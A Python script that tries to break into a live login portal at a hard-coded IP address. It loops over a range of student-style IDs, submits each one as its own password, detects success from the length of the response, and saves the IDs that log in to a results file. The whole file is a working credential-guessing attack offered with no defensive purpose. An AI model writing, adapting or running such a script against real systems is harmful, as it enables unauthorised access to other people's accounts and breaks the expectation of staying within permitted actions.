import os

import bs4
import requests

base_url = 'http://115.248.50.60/registration/Main.jsp?sessionId=1&wispId=1'

headers = {
    'User-Agent':
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'
}


def is_password_correct(id):
    data = {
        'loginUserId': id,
        'authType': 'Pronto',
        'loginPassword': id,
        'submit': 'Login'
    }

    res = requests.post("http://115.248.50.60/registration/chooseAuth.do", data=data, headers=headers,
                        verify=False);
    soup = bs4.BeautifulSoup(res.text, "html.parser")
    findings: bs4.element.Tag = soup.font
    final = (str(findings.contents[-1])).__len__()
    if final == 38:
        return True
    else:
        return False


source_code = requests.get(base_url, headers=headers, verify=False)

headers.update({"Cookie": "JSESSIONID=" + source_code.cookies["JSESSIONID"]})

fruits = range(2383, 2420)

print("Execution Started")
for x in fruits:
    my_id = '18BCE' + str(x)
    if is_password_correct(my_id):
        try:
            os.mkdir('Results')
        except OSError:
            pass

        with open("Results/BCE.txt", "a") as my_file:
            my_file.write(my_id + "\n")
            my_file.close()

print("Execution Stopped")